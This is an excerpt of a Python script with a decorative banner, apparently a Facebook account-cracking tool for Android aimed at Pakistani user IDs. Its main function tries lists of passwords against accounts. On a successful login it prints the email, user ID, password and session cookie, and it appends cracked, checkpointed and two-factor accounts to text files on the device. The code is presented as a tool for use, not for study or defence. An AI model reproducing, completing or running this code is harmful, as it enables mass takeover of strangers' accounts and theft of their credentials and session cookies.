...
'\33[1;95m$$ |  $$ |      $$ |  $$ |      $$ |\$  /$$ |
'\33[1;97m$$ |  $$ |      $$ |  $$ |      $$ | \_/ $$ |
'\33[1;95m\__|  \__|      \__|  \__|      \__|     \__|
                                                                                                                               
AUTHOR    : PICCI-ARIYAN
FACEBOOK : PICCI-ARIYAN
VERSION    : 2.1
                                   [ONLY PK ID]
...
def Random():
    ...
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :0306‡\033[0;m]")
    print(f"")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[âˆš]---------------------[AAM-OK]--------------------[âˆš]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')
                cek_apk(session,coki)
                open('/sdcard/AAM-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[Ã—]--------------------[AAM-CP]---------------------[Ã—]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\n[Ã—]---------------------------------------------------[Ã—]\033[1;97m')
                open('/sdcard/Aam-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/Aam-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[AAM] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
